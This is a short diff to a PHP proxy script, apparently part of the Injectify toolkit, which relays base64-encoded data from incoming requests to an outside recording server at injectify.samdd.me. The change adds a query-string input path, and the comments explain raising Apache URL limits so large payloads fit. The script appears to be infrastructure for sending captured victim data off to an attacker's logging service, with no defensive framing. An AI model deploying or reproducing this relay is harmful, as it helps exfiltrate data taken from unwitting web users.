@@ -15,17 +15,23 @@
     //        - logger/
     //             - index.php
     //    Proxy URL = https://mysite.com/logger/
+    //    Proxy URL = https://mysite.com/logger.php?
 
     // ADVANCED:
     //    - To inspect the contents of the log, append '&view' to the request URL
+    //    - Alternatively you can add pass the BASE64 as a query string
 
     // INCREASE APACHE2 URL LIMITS:
     //    sudo nano /etc/apache2/apache2.conf
     //    add the line `LimitRequestLine 1000000` to the bottom
     //    {CTRL-X}  {Y}  {ENTER}
     //    sudo service apache2 restart
-    $base64       = explode("/", $_SERVER['REQUEST_URI']);
-    $base64       = $base64[count($base64) - 1];
+    if (isset($_SERVER['QUERY_STRING'])) {
+        $base64 = $_SERVER['QUERY_STRING'];
+    } else {
+        $base64 = explode("/", $_SERVER['REQUEST_URI']);
+        $base64 = $base64[count($base64) - 1];
+    }
     $injectifyURL = "https://injectify.samdd.me/record/" . $base64;
     $response    = file_get_contents($injectifyURL);
 
